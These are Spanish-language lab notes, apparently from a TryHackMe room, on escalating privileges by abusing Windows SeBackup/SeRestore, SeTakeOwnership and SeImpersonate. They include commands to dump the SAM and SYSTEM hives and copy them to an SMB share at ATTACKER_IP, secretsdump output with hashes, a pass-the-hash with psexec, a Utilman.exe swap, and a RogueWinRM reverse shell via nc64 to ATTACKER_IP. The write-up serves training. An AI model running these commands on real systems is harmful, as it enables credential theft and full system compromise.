---
layout: apunte
title: "5. Abusing Dangerous Privileges"
---

<h2>Windows Privileges</h2>
Los privilegios son los "derechos" que una cuenta tiene sobre un archivo, directorio o tarea en un sistema.

Cada usuario tiene un conjunto asignado de privilegios que pueden comprobarse con el comando `whoami /priv`.

Una lista completa de privilegios Windows está disponible [aquí](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). Desde el punto de vista de un atacante, sólo los privilegios que nos permiten escalar en el sistema son interesantes. En el repositorio [Priv2Admin](https://github.com/gtworek/Priv2Admin) tienes una lista de privilegios explotables en Windows.

----------------------------------------
<h2>SeBacckup / SeRestore</h2>
Los privilegios SeBackup y SeRestore permiten a los usuarios leer y escribir cualquier archivo en el sistema ignorando cualquier DACL. La idea de estos privilegios es permitir a ciertos usuarios realizar backups de un sistema sin requerir permisos completos de administrador.

Con este poder en mano, un atacante puede escalar sus privilegios usando varias técnicas. La que veremos consiste en copiar los registros SAM Y SYSTEM para extraer el hash de la contraseña del administrador local.

Usaremos las credenciales dadas para acceder a la máquina.

Ahora, debemos ejecutar un cmd como administrador, desde la cuenta dada.

!**Pasted image 20251130141911.png**

Una vez se abra, podemos comprobar nuestros privilegios con el siguiente comando:

```cmd
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Para hacer un backup de los hashes de SAM y SYSTEM, podemos usar los siguientes comandos:

```cmd
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.
```

Esto creará un par de archivos con los contenidos del registro. Ahora podemos copiar estos archivos a nuestra máquina atacante usando SMB o cualquier otro método disponible. Para SMB, podemos usar `smbserver.py` para arrancar un servidor SMB con una compartición de red en el directorio actual.

```bash
user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

Esto creará una compartición llamada `public` que apunte al directorio `share` que requiere usuario y contraseña. Después, podemos usar el comando `copy` en la máquina Windows para transferir ambos archivos a la máquina atacante.

```cmd
C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

Y usamos el "impacket" para recuperar los hashes:

```bash
user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Ahora podemos usar el hash del Administrator para realizar un ataque Pass-the-Hash y ganar acceso al sistema con privilegios SYSTEM:

```bash
user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.82.139.97
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

-------------------------------------
<h2>SeTakeOwnership</h2>
El privilegio SeTakeOwnership permite a un usuario tomar posesión de cualquier objeto del sistema incluyendo archivos y claves de registro, abriendo muchas posibilidades para que un atacante eleve sus privilegios ya que podríamos, por ejemplo, buscar un servicio que corra como SYSTEM y tomar posesión de su ejecutable.

Usaremos las credenciales dadas para iniciar sesión en la máquina.

Ejecutamos la cmd como administrador e introducimos las credenciales dadas.

Una vez dentro, podemos comprobar nuestros privilegios con `whoami /priv`:

```cmd
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

Abusaremos `utilman.exe` para escalar privilegios esta vez. Esta es una aplicación integrada en Windows para ofrecer facilidad de acceso en la pantalla de bloqueo.

!**Pasted image 20251130153711.png**

Ya que Utilman corre con privilegios SYSTEM, ganaremos esos privilegios si reemplazamos el binario original por un payload nuestro. Como podemos tomar posesión de cualquier archivo, reemplazarlo es trivial.

Empezamos tomando posesión del binario.

```cmd
C:\> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
```

>[!NOTE] Ser el propietario de un archivo no implica que tengas privilegios sobre él. Pero siéndolo, puedes darte cualquier privilegio que quieras.

```cmd
C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files
```

Después de esto, cambiamos `utilman.exe` por una copia de `cmd.exe`.

```cmd
C:\Windows\System32\> copy cmd.exe utilman.exe
        1 file(s) copied.
```

Para disparar utilman, bloquearemos nuestra pantalla desde el botón de windows "**Lock**".

!**Pasted image 20251130155554.png**

Y por último le damos a "Ease of Access", que ejecutará `utilman.exe` con privilegios SYSTEM.

!**Pasted image 20251130155641.png**

------------------------------
<h2>SeImpersonate / SeAssignPrimaryToken</h2>
Estos privilegios le permiten a in proceso hacerse pasar por otros usuarios y actuar en su nombre. Esto es fácil de entender cuando pensamos en cómo funciona un servidor FTP. Este debe restringir a los usuarios para que sólo puedan acceder a sus contenidos.

Asumamos que tenemos un servidor FTP corriendo con el usuario `ftp`. Sin impersonation, si el usuario Ann inicia sesión e intenta acceder a los archivos, el servicio FTP trataría de acceder a ellos con su token de acceso en lugar del de Ann.

!**Pasted image 20251130164033.png**

Hay varias razones por las que usar el token de ftp no es buena idea:

- Para que los archivos se sirvan correctamente, necesitarían ser accesibles al usuario `ftp`. En el ejemplo de arriba, el DACL de los archivos de Bill no permite a "ftp" acceder a ellos. Esto requiere configuración extra y añade complejidad.
- Para el sistema operativo, todos los archivos son accedidos por "ftp", sin importar el usuario actual. Esto hace imposible delegar la autorización al sistema operativo por lo que FTP debe implementarla.
- Si el servicio FTP es comprometido, el atacante gana acceso inmediatamente a todos los archivos a los que tenga acceso "ftp".

Si, por otro lado, el usuario "ftp" tiene el privilegio SeImpersonate o SeAssignPrimaryToken, todo esto se simplifica ya que el servicio FTP puede tomar temporalmente el token del usuario que accede y usarlo para realizar cualquier tarea en su nombre.

!**Pasted image 20251130164854.png**

Ahora, si el usuario Ann inicia sesión en el servicio FTP, y dado que el usuario ftp tiene privilegios de impersonation, puede tomar prestado el token de Ann y usarlo para acceder a sus archivos. De esta manera, no necesitamos dar permisos de acceso al usuario ftp. Mientras el servidor se hace pasar por Ann, no podrá acceder a archivos de ningún otro usuario para los que Ann no tenga permisos.

Como atacantes, si conseguimos tomar control de un proceso con SeImpersonate o SeAssignPrimaryToken, podemos hacernos pasar por cualquier usuario que se conecte y autentifique.

En los sistemas Windows, los usuarios LOCAL SERVICE y NETWORK SERVICE ACCOUNTS ya tienen dichos privilegios. IIS también creará una cuenta similar llamada "iisapppool\defaultapppool" para aplicaciones web.

Para elevar privilegios usando dichas cuentas, un atacante necesita hacer lo siguiente:

1. Spawnear un proceso para que los usuarios puedan conectarse y autentificarse.
2. Encontrar una manera de forzar que los usuarios privilegiados se conecten y autentifiquen.

Usaremos el exploit RogueWinRM para conseguir ambas condiciones.

Empecemos asumiendo que ya hemos comprometido una página corriendo en un IIS y que hemos plantado una webshell en la siguiente dirección:  `http://<ip>`

Podemos usar la webshell para comprobar si tenemos privilegios en la cuenta comprometida y confirmar que tenemos ambos privilegios:

!**Pasted image 20251130171345.png**

Para usar RogueWinRM, necesitamos subir el exploit a la máquina víctima.

Este exploit es posible porque siempre que un usuario (incluyendo los no privilegiados) arrancan el servicio BITS en Windows, automáticamente crea una conexión al puerto 5985 usando privilegios de SYSTEM. Este puerto se usa típicamente para el servicio WinRM, que es un puerto que expone una powershell para ser usada de forma remota. Es como SSH pero usando powershell.

Si por alguna razón el servicio WinRM no está corriendo en el servidor objetivo, un atacante podría arrancar un servicio WinRM falso en dicho puerto y capturar el intento de autentificación hecho por el servicio BITS al empezar. Si el atacante tiene privilegios SeImpersonate puede ejecutar cualquier comando en nombre del usuario que ese conecte, que es SYSTEM.

Antes de ejecutar el exploit, arrancamos un listener en nuestra máquina con `nc -lvp 4442`.

Y luego usamos nuestra propia webshell para usar el exploit con el siguiente comando.

`c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"`

!**Pasted image 20251130192516.png**

>[!IMPORTANT] El exploit puede tardar hasta 2 minutos en funcionar, ten paciencia.

- `-p`: Especifica el ejecutable a ejecutar por el exploit.
- `-a`: Se usa para pasar argumentos al ejecutable.

Si lo hicimos bien, recibiremos la consola.